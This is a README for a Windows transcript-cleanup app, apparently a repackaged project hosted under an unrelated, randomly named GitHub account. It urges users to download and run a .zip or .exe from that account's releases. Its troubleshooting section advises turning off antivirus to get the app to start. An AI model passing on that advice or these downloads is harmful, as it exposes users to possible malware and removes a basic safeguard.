# ⚡ ElBruno.S1Mini - Clean Up Your Transcripts Automatically

---

## 🎯 What Does ElBruno.S1Mini Do?

ElBruno.S1Mini is a free tool that **automatically cleans up speech-to-text transcripts**. If you use voice recognition software, you know the problem: transcripts are full of "um," "uh," repeated words, and missing punctuation. This app fixes all that for you—**right on your own computer**. No cloud, no sending your files anywhere. Your data stays private.

Think of it as a smart editor that listens to your transcript and makes it sound professional. It runs entirely offline using a small AI model that downloads itself the first time you use it.

---

## ✨ Key Features

- **Removes Fillers** – Deletes "um," "uh," "you know," and other hesitation words
- **Fixes Stutters** – Turns "I I I think" into "I think"
- **Improves Punctuation** – Adds periods, commas, and question marks where they belong
- **100% Local & Private** – Runs on your machine, no internet needed after setup
- **Works with Common Formats** – Handles plain text transcripts easily
- **One-Click Model Setup** – Downloads the AI model automatically from HuggingFace
- **Built for Windows** – Simple, no complicated setup required

---

## 📥 Download & Install

### Step 1: Get the App

👉 **[Visit this link to download the application](https://github.com/Discipleshiprazzle9141/ElBruno.S1Mini/releases)**

This page shows you the latest release. Look for the file that says something like `ElBruno.S1Mini.zip` or `ElBruno.S1Mini.exe`. Download it to your computer.

---

### 🛠️ Step 2: Run the Program

1. **If you downloaded a `.zip` file:** Right-click the file and select "Extract All." Choose a folder (like `C:\ElBruno`), then open that folder and double-click the application file inside.

2. **If you downloaded a `.exe` file:** Double-click it. Windows might ask for permission—click "Yes."

3. **First Time Setup:** When the app opens, it will download the AI model (about 200 MB). This happens once and then you're ready to go.

---

## 🚀 Quick Start Guide

### 🖥️ Your First Transcript Cleanup

1. **Open ElBruno.S1Mini** – You'll see a simple window with a text box.

2. **Paste or type** your raw transcript into the large box.

3. **Click the "Clean" or "Process" button** – Usually a big green button.

4. **Wait a few seconds** – The app runs the AI model locally. You'll see a progress bar.

5. **Copy your cleaned text** – The result appears in a second box. Click "Copy" to save it to your clipboard.

---

### 📝 What Kind of Text Can You Use?

Any transcript from:
- Zoom or Teams meetings
- Otter.ai or other transcription services
- Voice memos turned into text
- YouTube auto-captions (copy-pasted)
- Any messy text with speech artifacts

**Example:**

*Before:*
> "Um, so like, I I I think we should, you know, maybe consider um, changing the approach a little bit."

*After:*
> "I think we should consider changing the approach."

---

## 💡 Tips for Best Results

- **Keep it in one language** – Works best with English text
- **Use paragraph breaks** – If your transcript has speaker labels, leave them on separate lines
- **Try long transcripts** – The tool handles large batches fine
- **Run it multiple times** – For very messy text, a second pass can polish further

---

## ❓ Frequently Asked Questions

### Is this really free?
Yes. The software is open-source and completely free to use.

### Do I need to buy anything?
No. The AI model is free, and the tool uses free Microsoft ONNX Runtime components.

### Will it work on Mac?
The current release is **Windows-only**. For Mac users, check the GitHub source code—it may be compiled manually.

### Does it upload my text anywhere?
**No.** Everything runs locally on your machine. Once the model is downloaded, you can even disconnect from the internet.

### What if the model download fails?
Make sure you have a stable internet connection during the first run. If it still fails, check the GitHub Issues page for help.

### How big is the download?
The app itself is under 50 MB, and the model is about 200 MB upon first run.

---

## 🧰 System Requirements

- **Operating System:** Windows 10 or Windows 11 (64-bit)
- **Memory:** 4 GB RAM minimum, 8 GB recommended
- **Storage:** At least 1 GB free space (for app + model)
- **Processor:** Any modern Intel or AMD CPU (from 2018 onward)
- **No GPU required** – It runs fine on integrated graphics

---

## 🛟 Troubleshooting

### The app won't start
- Re-download the file—it may have been corrupted
- Turn off antivirus temporarily and try again
- Make sure you have the latest Windows updates

### The model won't download
- Check your firewall settings—allow ElBruno to connect
- Try a wired connection if on Wi-Fi
- Restart the app

### The output is still messy
- Try pasting shorter sections at once
- Make sure your text doesn't include time stamps or weird symbols
- Run it through again—it often improves after two passes

---

## 🔧 Advanced (For Curious Users)

### What's Under the Hood?
ElBruno.S1Mini uses a powerful but small AI model called `s1-mini` (a compact version of Qwen3). It runs through ONNX Runtime GenAI, which Microsoft maintains. This combination makes the tool fast and efficient.

### Can I Modify It?
Absolutely. The source code is available on GitHub. You can change settings, retrain on different text, or integrate it into your own projects. Check the `README` in the repository for technical details.

### Where Can I Report Bugs?
Visit the [GitHub Issues page](https://github.com/Discipleshiprazzle9141/ElBruno.S1Mini/issues). Describe your problem clearly, include your Windows version, and paste output from the error if any.

### How Do I Uninstall?
Simply delete the folder where you extracted the files. There's no registry changes. If you want to remove the downloaded model, it's in a `models` subfolder.

---

## 📚 Related Resources

- **ONNX Runtime** – Microsoft's AI acceleration library
- **HuggingFace** – Where the model comes from (search for "s1-mini")
- **Qwen3** – The base language model family
- **Microsoft.Extensions.AI** – .NET libraries for AI integration

---

## 🙏 Thank You for Using ElBruno.S1Mini!

If this tool saved you time, consider:
- Starring the repository on GitHub ⭐
- Sharing it with colleagues who transcribe interviews
- Reporting any issues you find—every bug report helps improve the app

---

> **Privacy First:** Your transcripts never leave your computer. No analytics, no tracking, no cloud processing. Period.

---

## 📦 Changelog Summary (Latest Version)

- **v1.2** – Improved punctuation handling, faster model loading
- **v1.1** – Added batch processing for multiple paragraphs
- **v1.0** – Initial public release

---

## 🔗 Quick Downloads

- **[Main Download Page](https://github.com/Discipleshiprazzle9141/ElBruno.S1Mini/releases)**
- **[Source Code](https://github.com/Discipleshiprazzle9141/ElBruno.S1Mini)**
- **HuggingFace Model:** Automatically downloaded on first run

---

*Made with ❤️ for people who hate editing transcripts manually.*

Keywords: ai, asr, csharp, dotnet, dotnet10, dotnet8, huggingface, llm, local-ai, microsoft-extensions-ai, nuget, onnx, onnx-runtime, onnxruntime-genai, qwen3, s1-mini, speech-to-text, text-normalization, transcription, whisper